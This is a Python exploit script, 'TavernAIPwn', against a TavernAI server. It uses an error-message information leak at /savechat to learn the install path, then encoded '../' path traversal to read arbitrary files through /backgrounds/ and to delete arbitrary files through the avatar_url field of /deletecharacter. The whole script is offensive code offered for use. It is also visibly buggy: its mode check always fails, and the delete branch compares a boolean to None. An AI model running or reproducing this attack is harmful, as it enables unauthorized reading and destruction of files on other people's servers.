#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
A basic program that exploits 3 vulnerabilities to read files and delete them.

@Author: Nameless9000
@Date: 07/02/2023
"""

import requests
import json
import re
import argparse

# command args
parser = argparse.ArgumentParser(
    prog = 'TavernAIPwn',
    description = 'Arbitrary file read on target.')
parser.add_argument('filePath',
    help = "file path (without the drive)")
parser.add_argument('-t', '--target', default="http://127.0.0.1:8000",
    help = "target instance to attack")
parser.add_argument('-o', '--offset', default=2, type=int,
    help = "file path offset, 2 is C:/")
parser.add_argument('-m', '--mode', default="R",
    help = "operating mode, (R = read, D = delete)")

args = parser.parse_args()

if (args.mode != "R") or (args.mode != "D"):
    exit("Mode is not in read or delete.")

target = args.target + "/"

# exploit information disclosure to get file path
error = requests.request("POST", target+"savechat", headers={"Content-Type":"application/json"}, data="{}")

# get path from error
parsedError = re.search(r" (\w:[\w\W]+)server\.js", error.text)

# check it
if parsedError == None:
    exit("=> Target not vulnerable")
else:
    print(f"=> Vulnerable target ({target})")

path = parsedError.group(1).strip()

# use another vulnerability combined with file path to read any file
def readFile(filePath, offset = 2):
    root = "%2e%2e/" * (path.count("\\") + offset)
    url = target+"backgrounds/"+root+filePath
    fileData = requests.request("GET", url)

    if fileData.text == "File not found":
        return None

    return fileData.text

# use another vulnerability combined with file path to delete any file
def deleteFile(filePath, offset = 2):
    root = "%2e%2e/" * (path.count("\\") + offset)

    url = target+"deletecharacter"
    fileData = requests.request("POST", url,
        headers={'Content-Type':'application/x-www-form-urlencoded'},
        data='avatar_url='+root+filePath
    )

    return fileData.text == "ok"

if args.mode == "R":
    fileData = readFile(args.filePath, args.offset)
    if fileData == None:
        exit("File not found or is unreachable.")

    print(fileData)
else:
    fileData = deleteFile(args.filePath, args.offset)
    if fileData == None:
        exit("File not found or is unreachable.")

    print(fileData)
